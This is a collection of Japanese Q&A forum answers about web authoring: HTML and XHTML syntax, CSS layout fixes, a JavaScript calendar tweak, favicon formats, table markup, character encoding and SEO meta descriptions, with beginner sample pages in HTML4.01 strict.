サーバーにデータを送るのでしたら、 ＞「依頼書No」の部分をクリックすると、 　の部分をフォームにして置けばよいだけですが？？？ <form action="[URL]">で、デザインをスタイルシートで普通の形に直しても良いし、 <a href="[URL]">依頼書No</a> でもよい、この場合データはgetで渡されますから、QUERY_STRINGにデータを書きます。
そのままで良いです。 こちらに詳しい・・・ 　⇒wwwの有無とその統一,(SEOから考えたwwwの意味)( http://as76.net/prg/htac_www.php )
まず仕様書を確認する癖をつける。・・皆描いてある。それ以外にも知っておくべきことも・・ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 9.1 空白類 　文書文字集合には、多様な空白類文字が含まれている。 その多くは、特定の視覚的スペーシング効果を生成するために何らかのアプリケーションが用いる印刷術的要素である。 HTMLでは、次に挙げる文字だけが空白類文字であると定義される。 ・ASCIIスペース (&#x0020;) ・水平タブ (&#x0009;) ・書式送り (&#x000C;) ・ゼロ幅スペース (&#x200B;) 　行区切り類もまた、空白類文字である。 ここで、&#x2028; 及び &#x2029; が[ISO10646]では行や段落を明確に分離するものと定義されているが、HTMLでは行区切り類に含まれないし、更に本仕様は両者を空白類文字一般にも含めないという点に、注意されたい。 　本仕様は、ここに空白類文字と明示的に定めたもの以外のスペース文字類については、レンダリングその他の挙動を示すことはない。 この理由から、著者は、空白類を含む視覚的整形効果を及ぼすためには、スペース類文字ではなく適切な要素あるいはスタイル指定を行う必要がある。 　・・・【中略】・・・ 　ここで、ソース文書中で語間に空白類が複数連なっている場合、PRE要素を除いて、レンダリング結果の語間スペース調整は全く異なるものになるという点に注意されたい。 特にユーザエージェントは、語間スペースの出力処理に際しては、連続する空白類の入力があった場合は1つにまとめてしまう必要がある。 これは、lang属性やHTTP "Content-Language"ヘッダフィールド([RFC2616]の14.12参照)、ユーザの設定、等による言語情報が存在しない場合であっても、可能かつ必要な動作である。 　・・・【中略】・・・ 　SGMLの行区切り規則への抵触や、現存する実装間の矛盾を回避するため、著者は、ユーザエージェントが開始タグ直後または終了タグ直前の空白類をレンダリングするとは期待しないようにすべきである。 従って、著者――特にオーサリングツール――は、次のように書くべきであり: ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Paragraphs, Lines, and Phrases (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より <span>あ</span> <span>い</span> のふたつのspan要素の間には、改行コードと言う空白文字がありますから、半角スペース分あきます。行内要素の場合は、間に改行のみならず、半角スペース、タブもそれが空白文字として意味無い限り入れない。 　
htmlではなくて、HTMLです。---この区別は大事なので。 それはさておき、いずれもHTMLでは誤りです。 　必ずname属性があるはずです。 　HTMLでは、/> として閉じる事はしません。>でとじます。 　　XHTMLの場合は、/>です。HTML5の場合は許されます。 HTMLでは、 <input type="checkbox" name="hoge" value="サンプル" checked> が正しい <input type=checkbox name=hoge value="サンプル" checked> も良い。(属性値に半角スペースや全角文字を含まない場合は"は省略できる。 　また、 <INPUT TYPE=checkbox NAME=hoge VALUe="サンプル" checked> 　でもよい。 XHTMLの場合は <input type="checkbox" name="hoge" value="サンプル" checked="checked" /> です。 <input type="checkbox" name="hoge" value="サンプル" checked="checked"/> 　でもよいが、/の前の半角スペースがないと誤判断するブラウザがあるので半角スペースを置く--文法上の理由ではない。 　XHTMLは文法に厳密ですので、結果的にXMLでなければならない用途以外はHTMLを使うことになるでしょう。 　→「難しい技術は広く使われない( http://www.atmarkit.co.jp/news/200801/25/html.html )」 この様な場所では、断片的でしばしば誤った情報を得てしまいます。 わからないときは仕様書をチェックしましょう。正確で正しい情報が得られます。その上でわからないところを聞くのが効率的です。 　⇒3.2 HTMLで用いられるSGML構成素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　またinputは・・ <!ELEMENT INPUT - O EMPTY -- form control -->( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　と書かれている。 <!ELEMENT INPUT 　　- 　　　　O　　　　 EMPTY　　　　　　 -- form control --> <!要素　　INPUT 開始タグ 終了タグなし 内容を持たない空要素 --フォームコントロール--> もっと簡単なのは 　⇒Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 　のDATA入力(右上)を使う。
もう戻せません。 　他の文字コードで開いてしまうと、その文字は異なる文字として解釈され、別の文字コードで保存されますから・・ 　コメントなどは、書き直しましょう。 　ウェブの場合、もしリンク先のファイルに文字コードの指定があれば、その文字コードで開きますが、開いたときに他の文字コードがあれば異なる文字として解釈されます。そのために以後のascii文字などが引きずられて文字が変わってしまいます。 　また、文字コードの指定がない場合は呼び出し元のファイルと同じと解釈して開きます。 　@charsetを書きかえるときには、文字が正しいことを確認して保存しなければなりません。
ホームページ拝見致しました。 修正箇所はいくつかありますので、順を追って書かせていただきます。 ■CSS (cal.css) －－－－－－－－－－－－－ #36行目 div.cal_wrapper table.cal tr th p { float: left; padding: 5px; margin: 0px; color: #666; font-size: 12px; } ↓以下のように修正します。 div.cal_wrapper table.cal tr th p { /* float: left; */ text-align:center; padding: 5px; margin: 0px; color: #666; font-size: 12px; } ※floatをコメントアウトして、中央揃えのtext-align:centerを入れいます。 －－－－－－－－－－－－－ #46行目 div.cal_wrapper table.cal tr th div.cal_ui { float: right; } ↓以下のように修正します。 div.cal_wrapper table.cal tr th div.cal_ui { /*float: right;*/ } ※floatをコメントアウト －－－－－－－－－－－－－ ■JS(cal.js) 145行目 var calHTML = "<table border='0' cellspacing='0' cellpadding='0' class='cal'>"; calHTML += "<tr><th colspan='7'>"; calHTML += "<div class='cal_ui'>"; calHTML += "<input type='button' onclick='cal_move("+calId+",-1);' value='&lt; prev' />"; calHTML += "<input type='button' onclick='cal_move("+calId+",null);' value='-' />"; calHTML += "<input type='button' onclick='cal_move("+calId+",1);' value='next &gt;' />"; calHTML += "</div>"; calHTML += "<p>" + year + "年" + calObj.monthName[month] + "</p></th></tr>"; ↓この部分をまるまる修正しました。 まず既存のものはコメントアウト化 /* var calHTML = "<table border='0' cellspacing='0' cellpadding='0' class='cal'>"; calHTML += "<tr><th colspan='7'>"; calHTML += "<div class='cal_ui'>"; calHTML += "<input type='button' onclick='cal_move("+calId+",-1);' value='&lt; prev' />"; calHTML += "<input type='button' onclick='cal_move("+calId+",null);' value='-' />"; calHTML += "<input type='button' onclick='cal_move("+calId+",1);' value='next &gt;' />"; calHTML += "</div>"; calHTML += "<p>" + year + "年" + calObj.monthName[month] + "</p></th></tr>"; */ /* 以下に書き換えました。 */ var calHTML = "<table border='0' cellspacing='0' cellpadding='0' class='cal'>"; calHTML += "<tr>"; calHTML += "<th>"; calHTML += "<div class='cal_ui'>"; calHTML += "<input type='button' onclick='cal_move("+calId+",-1);' value='&lt; prev' />"; calHTML += "</div>"; calHTML += "</th>"; calHTML += "<th colspan='5'>"; calHTML += "<p>" + year + "年" + calObj.monthName[month] + "</p>"; calHTML += "</th>"; calHTML += "<th>"; calHTML += "<div class='cal_ui'>"; calHTML += "<input type='button' onclick='cal_move("+calId+",1);' value='next &gt;' />"; calHTML += "</div>"; calHTML += "</th>"; －－－－－－－－－－－－－ 以上です。 やったことは、 Javascriptの書き出しを <th>prev</th> <th colspan='5'>年月日</th> <th>next</th> に書き換えて、CSSで指定されていたfloatを無効化。 といった具合です。 ご参考までに。
javascriptが動く環境であるなら: 　vimですがこんな感じで色が付けば良いですか？ http://coolwanglu.github.io/vim.js/web/vim.html https://github.com/coolwanglu/vim.js ・動きはもっさり。@Centrinoのパソコン　私のPCでは常用に耐えませんでした。
ttps://www.google.co.jp/search?q=%22lab.synck.com%2FCal3.0%2F%22 グーグル検索 ttp://www.synck.com/contents/download/javascript/cal2.1.html 「設置作業にはちょっぴり知識が必要になったかもしれません。」 しっかりダウンロードできているのでしょうか？ 表示のデモを使うということ？Cal3.0？ <style type="text/css">を追加 前のお方の記載を利用。 <link rel="stylesheet" href="cal.css" type="text/css"> <style type="text/css"> div.schedule_wrapper,div.cal_wrapper {float: left; div.cal_wrapper {clear: left;} </style>
念のために聞きますが、リンクの飛びたい先は http://blog.fc2.com/?linkid=artmangallery じゃなくって http://ameblo.jp/pumpkin-seeds-hikikomori/ ですよね? でしたら <a href='http://ameblo.jp/pumpkin-seeds-hikikomori/'>不登校・引きこもり自助グループ＠京都～ゆんたく～</a> でできるはずです。 というか、なんで単に href 指定でできることで JavaScript を使っているのでしょうか?
簡単なサンプルです。 ★タブは＿に置換してあるので戻す。 ★http:はhttp：(全角：)に置換してあるので戻す <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http：//www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;line-height:1.8em;margin:0;} div.header,div.section,div.footer{width:90%;min-width:630px;max-width:900px;margin:0 auto;padding:5px;padding:0;} div.header div.nav ol{list-style:none;text-align:center;margin:5px auto;width:100%;line-height:2em;} div.header div.nav ol li{display:inline-block;width:30%;margin:0 5px;padding:0;position:relative;} div.header div.nav ol li a:link{display:block;width:100%;height:100%;text-decoration:none;} div.section{position:relative;} div.section div.nav{position:absolute;top:0;right:0;width:150px;margin-right:0;} div.section>*{margin-right:155px;} div.section div.nav ol li{margin:30px 0;height:5px;position:relative;} div.section div.nav ol li a{position:relative;top:-5px;} /* 色づけ */ a:link{background-color:yellow;} a:hover{background-color:orange;} div.section div.nav ol li a{background-color:transparent;} div.section div.nav ol li{background-color:yellow;} div.section p a{padding:0.5em 1em;} div.section ul li a{background-color:transparent;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿＿<div class="nav"> ＿＿＿<ol> ＿＿＿＿<li><a href="/Top">トップ</a></li> ＿＿＿＿<li><a href="/Profile">プロフィール</a></li> ＿＿＿＿<li><a href="/Contact">問合せ</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p> ＿＿＿HTML4.01(XHTML1.0,XHTML1.1)では、DIV要素のclass名は、文書構造を保管する目的で付けることになっていました。 ＿＿</p> ＿＿<blockquote cite="http：//www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4"> ＿＿＿<p> ＿＿＿＿DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ＿＿＿</p> ＿＿＿<address> ＿＿＿＿<a href="http：//www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4">The global structure of an HTML document (ja)</a> ＿＿＿</address> ＿＿</blockquote> ＿＿<p> ＿＿＿ところが、これが理解されてきたとは言いがたく、<a href="http：//www.w3.org/TR/html5-diff/#new-elements">HTML5 では、文書をよりよく構造化するために、次の要素が新しく追加されました。</a> ＿＿</p> ＿＿<ul> ＿＿＿<li><a href="http：//www.w3.org/TR/html5/sections.html#the-section-element"><code>section</code></a></li> ＿＿＿<li><a href="http：//www.w3.org/TR/html5/sections.html#the-article-element"><code>article</code></a></li> ＿＿＿<li><a href="http：//www.w3.org/TR/html5/grouping-content.html#the-main-element">main</a></li> ＿＿＿<li><a href="http：//www.w3.org/TR/html5/sections.html#the-aside-element">aside</code></a></li> ＿＿＿<li><a href="http：//www.w3.org/TR/html5/sections.html#the-hgroup-element"><code>hgroup</code></a></li> ＿＿＿<li><a href="http：//www.w3.org/TR/html5/sections.html#the-header-element"><code>header</code></a></li> ＿＿＿<li><a href="http：//www.w3.org/TR/html5/sections.html#the-footer-element"><code>footer</code></a></li> ＿＿＿<li><a href="http：//www.w3.org/TR/html5/sections.html#the-nav-element"><code>nav</code></a></li> ＿＿＿<li><a href="http：//www.w3.org/TR/html5/grouping-content.html#the-figure-element"><code>figure</code></a></li> ＿＿＿<li><a href="http：//www.w3.org/TR/html5/grouping-content.html#the-figcaption-element"><code>figcaption</code></a></li> ＿＿</ul> ＿＿<div class="nav"> ＿＿＿<ol> ＿＿＿＿<li><a href="/Top">トップ</a></li> ＿＿＿＿<li><a href="/Profile">プロフィール</a></li> ＿＿＿＿<li><a href="/Contact">問合せ</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
＞"動的に"位置をJSで変更させたい場合、良い方法がないかお聞きしたかったです。 　どのように・・・ 　もう少し具体的に!!!
keywordsはどうでもいいでしょう。検索エンジンはいまどきそんなところを見てインデックスを作成したりしないでしょう。 descriptionは現在でもgoogleで使用されており、検索結果の概要欄にdescriptionの内容そのままで表示される事もありますので、descriptionは書いた方がいいです。登録して日が浅い頃か、googleがまだそのページの価値が低いと判断しているうちなのか条件はよくわかりませんが。 また、各ページの概要を記述する部分なので、各ページで内容が異なっているべきです。 >そしてページ１つ１つ統一した場合と統一しなかった場合の違いはなんなんでしょうか？ 統一した場合には、googleで検索した時にどのページも同じ概要で表示される可能性があります。
1) <link rel="shortcut icon" href="./favicon.ico" type="image/vnd.microsoft.icon" /> <link rel="icon" href="./favicon.ico" type="image/vnd.microsoft.icon" /> HTMLの場合は/>は> 2)　あとは、ファビコンのフォーマット ・ICO形式：複数の色数と解像度（16x16と32x32の4ビット16色、8ビット256色、24ビット1600万色、さらにWindowsでは24x24, 48x48, 64x64[1]、Mac OS Xなどで利用される64x64と128x128サイズのものを任意の色数）を保存したものをマルチアイコンとして保存 ・GIF形式：16x16サイズで256色 ・PNG形式：16x16サイズで8ビット形式（256色）ないし24ビット形式 16x16サイズは必須です。 3) サーバー応答ヘッダで 　mime-type:image/vnd.microsoft.icon または 　mime-type:image/x-icon 　　text/plain　でもファビコンとして認識はしてくれると思いますが・・
ヒント <table border=1> <tr><td colspan=4>hoge</td></tr> <tr><td rowspan=5>hoge</td><td colspan=3>hoge</td></tr> <tr><td>hoge</td><td>hoge</td><td>hoge</td></tr> <tr><td>hoge</td><td>hoge</td><td>hoge</td></tr> <tr><td>hoge</td><td>hoge</td><td>hoge</td></tr> <tr><td>hoge</td><td>hoge</td><td>hoge</td></tr> </table> >tableの中にtableが入ってる感じです。 こっちはむしろ簡単です。 なので、難しいほうで、書いてみました。 これを改造すると、思った結果が得られますよ。 （あえて"回答"以外を回答しています）
＞<p>は外す必要の無い適切なモノでしょうか？それとも他の方法がありますで しょうか？ 　HTMLの根本は、大事なことなので、きちんと理解しましょう。 　HTMLはHyper Text Markup Languageの略ですが、Markupとは、その部分がその 文書のどんな構成要素であるかを示すという意味です。 　ここを読んでおくこと!!→『そこで、プレーンテキストのみを用いて、「タ グ」を使うことによってデータに意味を持たせることが考えられた。(　 http://ja.wikipedia.org/wiki/SGML )』 　HTMLのタグは、デザインのためではなく!!、その部分が何であるかを示す目印 です。 　￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ <p></p>は、最も基本的な段落(Paragraph)を示す目印--マークアップです。 <dvi class="xxx"> <p><span class="a">水戸光圀</span>／<span class="b">東野英治郎</span></p> <p><span class="a">佐々木すけさぶろう</span>／<span class="b">里見浩太朗 </span></p> </div> 『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造 を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　HTML4.01までは、文書の構造を示す目印(タグ)がありませんで下ので、DIVや SPANと、idやclassを併用して文書構造を示してきました。 　HTML5では、より明確に 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから NOTE: Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.4 Grouping content ? HTML5( http://www.w3.org/TR/html5/grouping-content.html … )］より 　≒ DIVは他に適切な要素がないときの最後の最後の手段として使用すること!! ★この場合は配役と俳優名のリストですから、最適なマークアップは、DL(用語と その説明を示す-- 定義リスト( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )でしょう。そのうえで、class名で意味を追加して置きます。 <dl class="castingList"><!-- 後でわかるように --> 　<dt>水戸光圀</dt> 　<dd>東野英治郎</dd> 　<dt>佐々木すけさぶろう</dt> 　<dd>里見浩太朗</dd> </dl> 　 このようにHTMLは、文書構造をマークアップします。 　その上で、プレゼンテーションとして、用語とその説明を横に並べます。 dl.castingList dt{ font-weight:bold;/* 太字にして */} dl.castingList dd{margin-left:5em;} とか・・ ・構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　これを守っておくと、先で二段に表示用しようとか、スタイルシートだけで 表示を変更できます。そして、なによりも自分も他人も検索エンジンも理解して くれる。
http://html5.sophia-it.com/reference/%E9%9F%B3%E … WMAが、原因かも。 MP3だとどうですか？
＞最近、Windows7へ上げ、同じHTMLをIE11で開いたところ、#つきの画像が表示できなくなった次第です。 　だとしたら、その動作が正常です。 　#は本来ブラウザがサーバーに要求してはならない文字です。 よって、URLエンコードしなければなりません。 <p align="center"><img src="Desert%231.jpg"></p>
No.4です。 ＞問題はデータベース内にある文字なのです。 たとえ、それがデータベースにあるものであろうと、最終的にリンクをたどって 表示されるものなら関係ないです。 データベースの中までは検索できないというだけです。 原因はNo.4にも書きましたが・・ 　原因) 検索エンジンがクロールしてインデックスを作ってくれていない。 　　対策)ひたすら待つ。サイトマップをgoogleに申告する。 　原因) HTMLがまずくてページの内容を理解できていない。 　　対策)class名に文書構造を示すものを使う。(googleが十数年主張し続けている) 　　　　<div class="section"><div class="nav"> 　　　『id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　　　『HTML5 では、文書をよりよく構造化するために、次の要素が新しく追加 されました。( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』 　　　　これは、極めて重要のようです。googlebotはこれを解釈しているよう ですね。 　⇒ウェブマスター向けガイドライン（品質に関するガイドライン） - ウェブマ スター ツール ヘルプ( https://support.google.com/webmasters/answer/357 … ) 　を隅々まで読むこと。あなたが主張されるように 「どうすれば自分のウェブサイトが独自性、価値、または魅力のあるサイトとい えるようになるかを考えてみる。同分野の他のサイトとの差別化を図ります。( https://support.google.com/webmasters/answer/357 … )」が出来てい れば、必ずgoogleは見つけてくれます。 ＞問題はデータベース内にある文字なのです。おそらくあなたは論点が理解でき ていないように 思います。 ＞私の書いたＨＴＭＬ(PHPを含む）サイトにはチューリップや育て方などの文字 がそもそも無いわけです。 　リンクをたどって生成されるHTMLにそれがありさえすれば良いのです。 　テクニックとしては、<div class="summary">とか<div class="abstract">の ように、class名で明示して、紹介しているサイトの要約がわかるようにするの も良いでしょう。 ★googleが訪問してインデックスを作るまでには日数がかかります。 ・検索エンジンではなく、ユーザーの利便性を最優先に考慮してページを作成する。 ・ユーザーをだますようなことをしない。 ・検索エンジンでの掲載位置を上げるための不正行為をしない。 ・どうすれば自分のウェブサイトが独自性、価値、または魅力のあるサイトとい えるようになるかを考えてみる。 　これに尽きると思います。 ※他の同系統の良いサイトから、自然とリンクされるようになるのが最もよいで す。裏技ですが、それらのサイトにコメント投稿欄に紹介するとか・・ 　とにかく、googleに取っ掛かりの情報を提供すること ※googleで検索で出てくるようになって、ユーザーがあなたのページを見てすぐ 引き返してくるようでは順位が下がっていきます。よいページが出来たようです ね。たぶん、そのうち見つけてくれる。 　それまで、「独自性、価値、または魅力のあるサイト」になるよう頑張ってく ださい。
あれ？そんなにセル数いります？ <table border="1" width="500" height="300"> <tr><th></th><th colspan="4"></th></tr> <tr><td></td><td colspan="4"></td></tr> <tr><td></td><td colspan="2"></td><td colspan="2"></td></tr> <tr><td></td><td></td><td colspan="2"></td><td></td></tr> <tr><td></td><td colspan="4"></td></tr> </table> ※「 border="1" width="500" height="300"」はテーブル構造に直接関係ありません。
＞複数表示させるにはどうすればいいのでしょうか。 　単にスタイルシートだけの問題になりますから(^^)・・HTMLもjavascriptもほとんど手を加える必要がない。そもそも、そうすべき事はわかりますよね。 1) javascript部分の変更 　外部スタイルシートにしたほうが良い var css = new Array( '<link rel="stylesheet" type="text/css" media="screen" href="CSS/1.css">', '<link rel="stylesheet" type="text/css" media="screen" href="CSS/2.css">', '<link rel="stylesheet" type="text/css" media="screen" href="CSS/3.css">', '<link rel="stylesheet" type="text/css" media="screen" href="CSS/4.css">', '<link rel="stylesheet" type="text/css" media="screen" href="CSS/5.css">', '<link rel="stylesheet" type="text/css" media="screen" href="CSS/6.css">' ); スタイルシート 6タイプ [1.css] @charset "Shift_JIS"; div.section div.nav ol li{display:list-item;} div.section div.nav ol li+li+li{display:none;} div.section{background-color:fuchsia;} div.section div.nav{border-color:red;} [2.css] @charset "Shift_JIS"; div.section div.nav ol li{display:list-item;} div.section div.nav ol li+li{display:none;} div.section div.nav ol li+li+li{display:list-item;} div.section div.nav ol li+li+li+li{display:none;} div.section{background-color:silver;} div.section div.nav{border-color:gray;} [3.css] @charset "Shift_JIS"; div.section div.nav ol li{display:list-item;} div.section div.nav ol li+li{display:none;} div.section div.nav ol li+li+li+li{display:list-item;} div.section{background-color:aqua;} div.section div.nav{border-color:blue;} [4.css] @charset "Shift_JIS"; div.section div.nav ol li{display:none;} div.section div.nav ol li+li{display:list-item;} div.section div.nav ol li+li+li+li+li{display:list-item;} div.section{background-color:yellow;} div.section div.nav{border-color:orange;} [5.css] @charset "Shift_JIS"; div.section div.nav ol li{display:none;} div.section div.nav ol li+li{display:list-item;} div.section div.nav ol li+li+li{display:none;} div.section div.nav ol li+li+li+li{display:list-item;} div.section{background-color:lime;} div.section div.nav{border-color:green;} [6.css] @charset "Shift_JIS"; div.section div.nav ol li{display:none;} div.section div.nav ol li+li+li{display:list-item;} div.section div.nav{border-color:silver;} 注意) 　まず、HTMLやスタイルシートをきちんと身につけましょう。 　デザインや動作なんて、よっぽど酷くさえなければ、ユーザーはコンテンツの充実だけで訪問してくる。 『どうすれば自分のウェブサイトが独自性、価値、または魅力のあるサイトといえるようになるかを考えてみる。同分野の他のサイトとの差別化を図ります。( https://support.google.com/webmasters/answer/357 … )』 　はデザインじゃない、内要素のものなのですよ。
HTML5じゃない!!! <!DOCTYPE HTML><!-- 小文字のほうがよいかも --> <html><!-- langは必須 --> <head> <meta charset="utf-8"> ・・・【中略】・・・ </head> <body> <center><!-- centerは使えない --> <a href="index.html">戻る</a><!-- a要素はbodyには書けない --> <table border="5"> <tr bgcolor="#1FD3DF"> ・・・以下width,height,bgcolorは使ってはなりません。 </body> </html> ★javascriptではなくCGIを使うほうが良いでしょう。 ★widthやheightを指定せず、スタイルシートで%指定しましょう。 ★表は表示幅に合わせて伸縮してくれます。 その内容でしたら、HTML5の必要はない。簡単なHTML4.01で十分です。ただしstrictにして、デザインはスタイルシートで。
<div id="sample1"> <iframe class="sample1" name="form" src="./comchat.cgi?mode=form&nam=&eml=&col=&retime=40&line=20" width="900" height="200"></iframe> <iframe class="sample2" name="log" src="./comchat.cgi?retime=40&line=20" width="900" height="900"></iframe> </div> ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑ ＨＴＭＬを上のようにして、CSSを ↓↓↓↓↓↓↓↓↓↓↓↓↓↓ .sample1{margin-bottom:1em;} 考え方の違いで、いか様にも書くことができると思います。 ここでは、各iframeに、クラス名を付けて対応してみました。
＞現在、htmlを勉強してメモ帳を使いHPサイトを作っているのですが、 　HTML(頭文字ですから必ず大文字です) 　HPサイトじゃ意味が通じません。ヒューレッドパッカード社(hp)のことじゃないと思いますが(^^)、利用する立場なら兎も角、製作立場になると「ウェブサイト」「ウェブページ」と正しく使わないと意味が通じなくなります。「ホームページに戻る」「HPに戻る( http://www8.hp.com/jp/ja/home.html )」じゃ困る。 ＞このコンピューターが差出人に識別されることを予防するため、画像がブロックされています。 　ブラウザのトラッキング防止機能が効いているのでしょう。 　画像へのパス指定を見直すこと。 　　複雑な説明になるので、説明はしません。 <HTML> <HEAD> <META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=Shift_JIS"> <TITLE>*****</TITLE> </HEAD> <BODY BGCOLOR="crimson"> <H1><font face="Beurk"size="7">*****</font></H1> <font face="HGP明朝L"size="4"></font><BR> <IMG SRC="sitd.gif"><BR> </BODY> </HTML> ・・・今から始めるには、これじゃあまりに酷すぎます。 1) 必ずDOCTYPEを書かなければなりません。 　HTML4.01strictだけに絞って身につけましょう。 　『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　まもなく勧告を迎えるHTML5は、HTML4.01strictの改訂で、HTML4.01の他のDTD、transitinal,framesetはありません。 2) <font face="Beurk"size="7"> ｆｏｎｔ要素は使えません。 　HTML4.01strictにはない。transitinalでも非推奨。XHTML1.1以来廃止、HTML5にはない。 3) <font face="Beurk"size="7"> 　　<IMG SRC="sitd.gif"> 　bodyに直接は書けません。 　<body>樹構造が下記ですが・・ 　　|-- <h1></h1> 　　|-- <font>ダメ 　　|-- <img>ダメ 　　|-- <br>ダメ 　bodyにはブロック要素しか置けません。 4) <br>通常は使わないです。BRは【ひとつの段落でありながら強制改行が必要なとき】 　HTML4.01では、住所の区切りなど 　HTML5では、詩の中の折り返しなど、それ自体がコンテンツの一部であるとき 　とされています。 　　日本語の場合は、段落の変わり目は行間ではなく字下げで示しますからサンプルのようにスタイルシートで指定します。 ・・・たった数行でこれだけ深刻なミスがあるという事は参考にされているページがとってもまずいという事です。 ＞更新するたびいくつかのファイル(メニュー等)もアップロードしないといけないのは、大変ではないですか？ 　小規模なサイトでしたら、コピーペーストで書き換えて一括してFTPでアップロードします。 　・ファイルを開かなくても置換できる高機能なテキストエディタなら一括置換できます。 　大規模になれば、includeという機能を使います。いわゆるＳＳＩ(Server Side Includes)今は考えないでよい。 ★最初に参考にすべきサイト・・HTML4.01の仕様書の翻訳メンバーの内田さんの書かれたもの・・ 　⇒はじめてのWebドキュメントづくり( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ ) ★参考にすべきページ 　⇒HTML 4.01仕様書( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　⇒1と2の間辺りからはじめるCSS講座( http://www6.plala.or.jp/go_west/beginner/css/ ) ★書いたらまずチェックする 　⇒Another HTML-lint gateway( http://cetus.sakura.ne.jp/htmllint/htmllint.html ) 　　口うるさいくらいですが、逆にどこを直すべきかも教えてくれる。 　[最低限のサンプル]HTML4.01strictです。 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<style type="text/css"> <!-- body{ background-color:gray;/* bodyの背景gray */ } div.header,div.section,div.footer{/* header,section,footerの指定 */ width:80%;/* 幅はwindowの80% */ margin:0 auto;/* 上下0、左右自動 */ padding:5px; background-color:silver;/* 背景はシルバー */ } p{ margin:0;/* 日本語用に段落間のマージンを消し */ line-height:1.8em;/* 日本語は字が大きいので行間を広げて */ text-indent:1em;/* 段落で字下げ */ } --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>質問</h2> ＿＿<p> ＿＿＿折角のサイト設立を目前に心が折れそうなので、どなたか解決方法を教えてください ＿＿</p> ＿</div> ＿<div class="section"> ＿＿<h2>回答</h2> ＿＿<p> ＿＿＿誰もが通ってきた道です。 ＿＿</p> ＿＿<p> ＿＿＿<strong>HTML4.01strictは、</strong>プレゼンテーションに関わる物が一切ないので、このように文書構造だけ記述すればよいので<strong>とっても楽です。</strong> ＿＿</p> ＿＿<p> ＿＿＿そのかわり、スタイルシートでプレゼンテーションを指定します。スタイルシートは、HTMLで行なうよりはるかに機能が豊富ですが、その分、覚えるのは大変です。しかし、いずれHTML5の時代が来ますが、そのときにはHTMLは文書構造だけ、スタイルシートはプレゼンテーションと完全に分かれますから、今のうちにHTML4.01strictで学んでおくと効率的です。 ＿＿</p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
